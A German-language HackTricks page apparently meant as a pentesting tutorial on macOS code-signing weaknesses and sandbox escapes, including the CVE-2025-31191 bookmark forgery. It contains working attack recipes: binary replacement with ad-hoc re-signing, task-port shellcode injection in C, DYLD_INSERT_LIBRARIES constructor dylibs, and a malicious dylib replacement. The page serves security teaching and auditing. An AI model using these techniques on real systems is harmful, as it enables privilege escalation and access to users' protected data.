# Schwachstellen bei macOS Code Signing & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc signierte Binaries

### Grundlegende Informationen

**Ad-Hoc signing** (`CS_ADHOC`) erstellt eine Code-Signatur **ohne Zertifikatskette**. Der signierte Code wird weiterhin gehasht, sodass die Validierung Änderungen erkennen kann, aber es wird keine Entwickleridentität bereitgestellt, die eine andere Komponente authentifizieren kann. Das Ersetzen und erneute Signieren der ausführbaren Datei erzeugt ein anderes CodeDirectory/CDHash.<sup>[[1]](#references)[[4]](#references)</sup>

Auf Macs mit Apple Silicon benötigen alle ausführbaren Dateien mindestens eine Ad-Hoc-Signatur. Daher findet man Ad-Hoc-Signaturen bei vielen Development-Tools, Homebrew-Paketen und Third-Party-Utilities.

### Warum das wichtig ist

- **Keine verifizierbare Signer-Identität** — Prüfungen, die nur einen Pfad, einen Ad-Hoc-Status oder einen nicht festgelegten Identifier akzeptieren, können nicht feststellen, wer das Binary erstellt hat.
- Third-Party-Ad-Hoc-Binaries in **privilegierten Positionen** (FDA, Daemons, Helpers) sind besonders wichtige Ziele, wenn ihre Datei oder ein übergeordnetes Verzeichnis beschreibbar ist.
- Eine CDHash-, Designated-Requirement- oder auf Requirements basierende TCC-Prüfung **erkennt** einen Austausch. Eine pfadbasierte Policy möglicherweise nicht; überprüfe die tatsächliche Requirement und teste die Berechtigung erneut, anstatt anzunehmen, dass sie ein erneutes Signieren übersteht.

### Ermittlung
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Angriff: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. Relaunch and verify the effective grant. It survives only when the
#    authorization is path-based (or otherwise does not pin the old CDHash).
```
---

## Debuggable Processes (get-task-allow)

### Grundlegende Informationen

Das **`com.apple.security.get-task-allow`**-Entitlement (oder das **`CS_GET_TASK_ALLOW`**-Flag) ermöglicht es einem autorisierten Debugger, den Task-Port des Prozesses zu erhalten, selbst wenn die Hardened Runtime dies normalerweise verhindern würde. Ein erfolgreicher Debugger kann Speicher lesen, Register ändern, Code injizieren und die Ausführung kontrollieren.<sup>[[3]](#references)</sup>

Dies ist **ausschließlich für Development Builds** vorgesehen. Einige Binaries von Drittanbietern werden jedoch mit diesem Entitlement in Production ausgeliefert.

> [!CAUTION]
> Ein Production-Binary mit `get-task-allow` ist eine starke Exploitation Primitive. `taskgated`, die Identität des Aufrufers, Sandboxing, Debugger-Entitlements und die Autorisierung für Developer Tools beeinflussen weiterhin, ob ein bestimmter Client den Task-Port erhalten kann. Teste sowohl mit `lldb`/`debugserver` als auch mit dem vorgesehenen Injector. Sobald die Attachment erfolgreich ist, läuft injizierter Code mit den Entitlements, TCC-Berechtigungen und dem Security Context des Ziels.

### Discovery
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Angriff: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Keine Library-Validierung + DYLD-Umgebung

### Laufzeitbasierte Aufhebung der Library-Validierung

Das private Entitlement **`com.apple.private.security.clear-library-validation`** deaktiviert die Library-Validierung nicht beim Prozessstart. Stattdessen erlaubt es dem Prozess, zur Laufzeit `csops(..., CS_OPS_CLEAR_LV, ...)` auf sich selbst aufzurufen. XNU entfernt daraufhin `CS_REQUIRE_LV | CS_FORCED_LV`, sofern der Aufrufer über das Entitlement verfügt und die zusätzlichen Prüfungen des Handlers erfüllt. Folglich kann ein Prozess erst dann zu einem geeigneten Ziel für Library-Injection werden, wenn er den Codepfad erreicht, der die Library-Validierung aufhebt.<sup>[[4]](#references)[[5]](#references)</sup>

### Die gefährliche Kombination

Wenn ein Binary **beide** folgenden Entitlements besitzt:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (lädt beliebige dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (akzeptiert DYLD-Umgebungsvariablen)

Dies ist eine äußerst wertvolle Code-Injection-Kombination, da die Hardened Runtime sowohl die nicht vertrauenswürdige Library als auch die DYLD-Umgebungsvariable zulässt. Der Startkontext kann DYLD-Variablen weiterhin entfernen (beispielsweise bei geschützten oder privilegierten Ausführungspfaden). Überprüfe daher die genaue Invocation, anstatt das Entitlement-Paar als uneingeschränkt wirksam zu betrachten.

### Entdeckung
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Angriff: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Temporäre Sandbox-Ausnahmen

### Wie sie die Sandbox schwächen

Temporäre Sandbox-Ausnahmen (`com.apple.security.temporary-exception.*`) öffnen Lücken in der App Sandbox:<sup>[[2]](#references)</sup>

| Ausnahme | Was sie ermöglicht |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Verbindung zu systemweiten XPC-/Mach-Diensten |
| `temporary-exception.files.absolute-path.read-write` | Lesen/Schreiben von Dateien außerhalb des App-Containers |
| `temporary-exception.iokit-user-client-class` | Öffnen von IOKit-User-Client-Verbindungen |
| `temporary-exception.shared-preference.read-only` | Lesen der Einstellungen anderer Apps |
| `temporary-exception.files.home-relative-path.read-write` | Zugriff auf Pfade relativ zu `~` |

### Mach-Lookup-Ausnahmen = Sandbox Escape Primitive

Die gefährlichste Ausnahme ist **mach-lookup** — sie ermöglicht es einer sandboxed App, mit privilegierten Daemons zu kommunizieren:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Angriff: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Code-Signing-Prüfungen sind keine Integritätsprüfung des XPC-Clients

Ein XPC-Service kann eine Verbindung authentifizieren, indem er den Code-Signing-Status aus seinem Audit-Token extrahiert und eine Apple-**platform binary** oder einen Client akzeptiert, der `CS_REQUIRE_LV`/`CS_FORCED_LV` trägt. Diese Tests beschreiben die ausführbare Datei und ausgewählte Prozess-Flags; sie beweisen nicht, dass der aktuelle Adressraum ausschließlich vertrauenswürdigen Code enthält. Untersuchungen an ImageCapture-Services zeigten, dass eine injizierbare Apple-Binary wie `/bin/ls` über `DYLD_INSERT_LIBRARIES` eine Angreifer-Dylib laden und sich anschließend als platform client verbinden konnte. Eine nachfolgende Prüfung auf Library-Validation-Flags wurde ebenfalls umgangen, bevor Apple den Service in macOS 15 so änderte, dass er sein privates Authorization-Entitlement verlangt.<sup>[[6]](#references)</sup>

### Offensiver Audit-Workflow

1. Reverse `listener:shouldAcceptNewConnection:` (oder den entsprechenden XPC-Handler auf niedriger Ebene) und identifiziere Entscheidungen, die ausschließlich auf `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV` oder `CS_FORCED_LV` basieren.
2. Führe eine Enumeration der von Apple signierten Clients durch, die das Protokoll verwenden können, und untersuche anschließend Hardened Runtime und Entitlements. Eine platform signature allein ist kein Beleg dafür, dass DYLD injection blockiert wird.
3. Teste den Kandidaten auf dem **Ziel-MacOS-Build**. Wenn eine Constructor-Dylib geladen wird, stelle die Service-Verbindung aus diesem Constructor her, damit das Audit-Token zum akzeptierten platform process gehört.
4. Wiederhole den Test für jeden Vendor-Patch: Das Hinzufügen eines weiteren veränderbaren Process-Status-Flags zur gleichen Authorization-Entscheidung entfernt möglicherweise nicht das Confused-Deputy-Primitive.
```bash
# Static triage of the intended client
codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -

# Dynamic check using the constructor dylib created earlier in this page
DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
```
> [!NOTE]
> Das Verhalten von DYLD, die AMFI-Richtlinie und dienstseitige Prüfungen ändern sich zwischen macOS-Releases. Ein Fehlschlag gegen einen vollständig gepatchten Host beweist nicht, dass dieselbe Chain beim verwundbaren Release fehlgeschlagen ist.

---

## Security-Scoped Bookmark Forgery (CVE-2025-31191)

Security-scoped bookmarks speichern die Dateiauswahl eines Benutzers über mehrere Starts hinweg. Eine sandbox extension ist an den Bootvorgang gebunden. Daher validiert `ScopedBookmarkAgent` sie und erstellt ein langlebiges, HMAC-authentifiziertes Bookmark. Wenn die App dieses Bookmark später präsentiert, validiert der Agent es und stellt eine neue sandbox extension aus. Das Signaturgeheimnis wird im Login-Keychain gespeichert, und ein App-spezifischer Schlüssel wird mithilfe der Bundle-ID abgeleitet.<sup>[[7]](#references)</sup>

Auf betroffenen Systemen verhinderte die Keychain-ACL, dass ein nicht vertrauenswürdiger Prozess das Secret von `com.apple.scopedbookmarksagent.xpc` **lesen** konnte, verhinderte jedoch nicht dessen Löschung. Eine kompromittierte sandboxed App konnte das Item durch ein Secret ihrer Wahl und eine vom Angreifer kontrollierte ACL ersetzen, den App-spezifischen HMAC-Schlüssel ableiten, Einträge in der beschreibbaren Bookmark-Plist des Containers fälschen und `ScopedBookmarkAgent` auffordern, diese gegen File-Access-Extensions einzutauschen. Dadurch wurde jede sandboxed Anwendung, die Security-Scoped Bookmarks verwendet, zu einem potenziellen Sandbox Escape mit beliebigem Dateizugriff – ohne zusätzliche Interaktion mit dem File Picker. Apple behob das Problem in den Security Updates vom 31. März 2025.<sup>[[7]](#references)</sup>

### Triage und Angriffskette
```bash
APP=/Applications/Target.app
BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
"$APP/Contents/Info.plist")"

# Identify apps that can persist app- or document-scoped file access
codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'

# Locate app-managed bookmark stores; names and schemas are application-specific
find "$HOME/Library/Containers" -type f \
\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null

# Inspect metadata for the agent's generic-password item (normally not its secret)
security find-generic-password -s com.apple.scopedbookmarksagent.xpc
```
Die Exploitationssequenz auf einem verwundbaren Host ist:

1. Code execution innerhalb einer sandboxed App erlangen, die persistente scoped bookmarks verwendet.
2. Das Keychain-Signing-Item des Agents durch ein bekanntes Secret mit permissiver ACL ersetzen.
3. `HMAC-SHA256(key=known_secret, data=bundle_id)` berechnen und ein Bookmark für einen nützlichen Pfad im beschreibbaren Bookmark-Store der App fälschen.
4. Den normalen Bookmark-Resolution-Pfad der Anwendung auslösen, damit `ScopedBookmarkAgent` eine Sandbox Extension zurückgibt.
5. Den neuen Dateizugriff verwenden, um ein Out-of-Sandbox-Execution- oder Datenziel zu überschreiben, das für diesen Benutzer verfügbar ist.

Dies ist eine **Technik für gepatchte Versionen**: Verwende sie, um die Trust Boundary zu verstehen und ungepatchte Systeme zu bewerten, nicht als Annahme über aktuelle Releases. Konzentriere dich beim aktuellen Testing auf Bookmark-Parsing, Identity Binding, den Lebenszyklus von Keychain-Items und das Confused-Deputy-Verhalten rund um den Agent.

---

## Private Apple Entitlements

### Was sie sind

Entitlements mit dem Präfix `com.apple.private.*` ermöglichen den Zugriff auf **Apple-interne APIs**, die nicht dokumentiert oder für Third-Party-Developer verfügbar sind. Third-Party-Binaries mit privaten Entitlements erhielten diese über Enterprise-Zertifikate, MDM oder eine Distribution außerhalb des App Store.

### Gefährliche private Entitlements

| Entitlement | Fähigkeit |
|---|---|
| `com.apple.private.tcc.manager` | Vollständiges Lesen/Schreiben der TCC-Datenbank |
| `com.apple.private.tcc.allow` | Zugriff auf bestimmte TCC-Services |
| `com.apple.private.security.no-sandbox` | Ohne Sandbox ausführen |
| `com.apple.private.iokit` | Direkter Zugriff auf IOKit-Treiber |
| `com.apple.private.kernel.\*` | Zugriff auf Kernel-Schnittstellen |
| `com.apple.private.xpc.launchd.job-label` | launchd-Jobs registrieren/verwalten |
| `com.apple.rootless.install` | In SIP-geschützte Pfade schreiben |

### Entdeckung
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Benutzerdefinierte Sandbox-Profile (SBPL)

### Was sie sind

Binärdateien können **benutzerdefinierte Sandbox-Profile** enthalten, die in SBPL (Seatbelt Profile Language) geschrieben sind. Diese Profile können restriktiver ODER **permissiver** sein als die standardmäßige App Sandbox.

### Prüfung benutzerdefinierter Profile
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Beschreibbare Bibliothekspfade

### Was sie sind

Wenn ein Binary eine dynamische Bibliothek aus einem Pfad lädt, in den der aktuelle Benutzer **schreiben** kann, kann die Bibliothek durch Schadcode ersetzt werden.

### Identifizierung
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Angriff: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Leitfaden zur Code-Signierung](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (Operationen `CS_OPS_*` und `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (Handler für `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
- [6] [Eine neue Ära der macOS Sandbox Escapes: Einblicke in eine übersehene Angriffsfläche und die Entdeckung von mehr als 10 neuen Schwachstellen](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [7] [Analyse von CVE-2025-31191: Ein auf Security-scoped Bookmarks basierender macOS Sandbox Escape](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
{{#include ../../../banners/hacktricks-training.md}}
